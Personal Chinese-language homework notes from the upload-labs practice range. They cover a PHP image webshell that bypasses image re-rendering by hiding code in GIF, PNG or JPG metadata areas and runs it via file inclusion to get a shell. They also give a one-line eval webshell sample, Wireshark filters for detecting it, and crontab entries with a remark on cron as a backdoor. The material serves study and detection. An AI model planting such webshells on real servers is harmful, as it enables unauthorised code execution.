> 个人 Web 安全作业整理。靶场：upload-labs。

## 1. 图片马 / 二次渲染绕过

```text
场景：upload-labs 第17关，对上传图片做二次渲染
原理：服务端重新生成图片（二次渲染），会去掉尾部附加的代码
```

创建图片马：

```php
// 在一个图片文件中写入
<?php phpinfo();?>
```

绕过思路：

```text
1. 上传"图片马"（合法图片 + 尾部拼 PHP 代码）
2. 若二次渲染删掉尾部代码 → 找"渲染后图片未变的位置"（如 EXIF/GIF 注释区）插入代码
3. 上传后通过 include 文件包含解析：
   include.php?file=图片路径
4. 图片码能正常执行 → getshell
```

> 二次渲染的关键：**渲染前后对比图片字节**，找到不被重绘的部分（如 GIF 全局色表、PNG IDAT 之后、JPG EXIF），把代码塞进去。

## 2. 一句话木马（结合流量分析）

```text
一句话特征：eval 函数 + base64 加密内容 + 传递值
例：<?php @eval($_POST['1234']);?>
```

流量中定位 webshell：

```text
http contains "eval" and http.request.method == "POST"
tcp contains "<?php @eval"
# 正常网站 images 下放图片，出现 .php 很可疑
```

## 3. Crontab 任务分析（Linux 后门维持）

```bash
# 编辑 crontab
sudo crontab -e

# 每天凌晨3点备份
0 3 * * * /usr/bin/tar -czf /backup/html-backup-$(date +\%Y\%m\%d).tar.gz -C / /var/www/html

# 周一至周五 9-17点每小时清理 /tmp 超7天文件
0 9-17 * * 1-5 /usr/bin/find /tmp -type f -mtime +7 -exec rm {} \;

# 每分钟运行脚本并记日志
* * * * * /home/user/script.sh >> /home/measure/sysinfo.log 2>&1
```

> crontab 常用作**后门维持/计划任务**——安全审计时检查 `/etc/cron.d/`、`/var/spool/cron/` 中的可疑条目（参考《系统加固》cron 权限控制章节）。
